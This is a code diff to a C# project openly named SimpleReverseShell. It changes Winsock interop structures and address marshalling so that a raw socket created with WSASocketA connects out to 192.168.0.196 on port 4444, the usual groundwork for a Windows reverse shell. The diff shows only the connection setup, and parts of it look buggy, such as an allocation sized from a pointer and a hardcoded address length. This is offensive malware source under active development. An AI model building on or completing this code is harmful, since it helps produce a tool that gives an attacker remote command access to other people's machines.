@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -175,7 +176,8 @@ namespace SimpleReverseShell
       internal short s_family;
       internal ushort s_port;
       internal In_Addr s_addr;
-      internal char sin_zero;
+      [MarshalAsAttribute(UnmanagedType.ByValTStr, SizeConst = 8)]
+      internal string sin_zero;
     }
 
     /// <summary>
@@ -185,10 +187,44 @@ namespace SimpleReverseShell
     [StructLayout(LayoutKind.Sequential)]
     internal struct In_Addr
     {
-      internal byte s_b1;
-      internal byte s_b2;
-      internal byte s_b3;
-      internal byte s_b4;
+      internal S_Un S_un;
+    }
+
+    [StructLayoutAttribute(LayoutKind.Sequential)]
+    public struct S_Un
+    {
+
+      public S_un_b S_un_b;
+
+      public S_un_w S_un_w;
+
+      public uint S_addr;
+    }
+
+    [StructLayoutAttribute(LayoutKind.Sequential)]
+    public struct S_un_b
+    {
+      /// u_char->unsigned char
+      public byte s_b1;
+
+      /// u_char->unsigned char
+      public byte s_b2;
+
+      /// u_char->unsigned char
+      public byte s_b3;
+
+      /// u_char->unsigned char
+      public byte s_b4;
+    }
+
+    [StructLayoutAttribute(LayoutKind.Sequential)]
+    public struct S_un_w
+    {
+      /// u_short->unsigned short
+      public ushort s_w1;
+
+      /// u_short->unsigned short
+      public ushort s_w2;
     }
 
     /// <summary>
@@ -198,8 +234,8 @@ namespace SimpleReverseShell
     internal struct SockAddr
     {
       internal ushort sa_family;
-      internal long s_addr;
-      internal ushort port;
+      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
+      internal string sa_data;
     }
 
     [StructLayout(LayoutKind.Sequential)]
@@ -231,38 +267,17 @@ namespace SimpleReverseShell
       var protcolInfo = new WSAPROTOCOL_INFOA();
 
       var addrIn = new In_Addr();
-      addrIn.s_b1 = 192;
-      addrIn.s_b2 = 168;
-      addrIn.s_b3 = 126;
-      addrIn.s_b4 = 128;
+      addrIn.S_un.S_addr = ConvertFromIPAddress(IPAddress.Parse("192.168.0.196"));
 
       var sockAddrIn = new SockAddr_In();
       sockAddrIn.s_family = 2;
       sockAddrIn.s_port = 4444;
       sockAddrIn.s_addr = addrIn;
 
-      var sockaddr = new SockAddr();
-      sockaddr.sa_family = (ushort)sockAddrIn.s_family;
-      sockaddr.s_addr = 3232267904;
-      sockaddr.port = 4444;
-
-
-      //sockaddr.sa_data = new byte[14];
-      //// Copy port number (assuming it's in network byte order)
-      //sockaddr.sa_data[0] = (byte)(sockAddrIn.s_port >> 8);  // High byte
-      //sockaddr.sa_data[1] = (byte)(sockAddrIn.s_port & 0xFF); // Low byte
-
-      //// Copy IPv4 address
-      //sockaddr.sa_data[2] = sockAddrIn.s_addr.s_b1;
-      //sockaddr.sa_data[3] = sockAddrIn.s_addr.s_b2;
-      //sockaddr.sa_data[4] = sockAddrIn.s_addr.s_b3;
-      //sockaddr.sa_data[5] = sockAddrIn.s_addr.s_b4;
-
-      //// Fill the rest of the sa_data array with zeros
-      //for (int i = 6; i < sockaddr.sa_data.Length; i++)
-      //{
-      //  sockaddr.sa_data[i] = 0;
-      //}
+      var sockAddrIntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
+      Marshal.StructureToPtr(sockAddrIn, sockAddrIntPtr, false);
+      
+      var sockAddr = Marshal.PtrToStructure<SockAddr>(sockAddrIntPtr);
 
       var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
 
@@ -274,15 +289,26 @@ namespace SimpleReverseShell
         throw new InvalidOperationException();
       }
 
-      IntPtr addrPointer = new IntPtr();
-      addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockaddr));
-      Marshal.StructureToPtr(sockaddr, addrPointer, false);
-      var connectSuccess = connect(socket, addrPointer, Marshal.SizeOf(sockaddr));
+      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIntPtr));
+      Marshal.StructureToPtr(sockAddr, addrPointer, false);
+      var connectSuccess = connect(socket, addrPointer, 16);
       
       if (connectSuccess != 0)
       {
         var errorCode = WSAGetLastError();
       }
+    }
+
+    private uint ConvertFromIPAddress(IPAddress ipAddress)
+    {
+      var bytes = ipAddress.GetAddressBytes();
+
+      if (BitConverter.IsLittleEndian)
+      {
+        Array.Reverse(bytes);
+      }
+
+      return BitConverter.ToUInt32(bytes);
     }
   }
 }
